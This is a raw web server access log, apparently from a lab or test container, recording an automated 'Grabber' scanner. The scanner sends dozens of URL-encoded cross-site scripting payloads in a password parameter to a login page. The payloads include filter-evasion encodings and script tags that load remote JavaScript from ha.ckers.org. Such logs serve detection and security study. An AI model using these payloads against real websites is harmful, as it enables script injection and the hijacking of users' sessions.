172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /?password=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:53 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
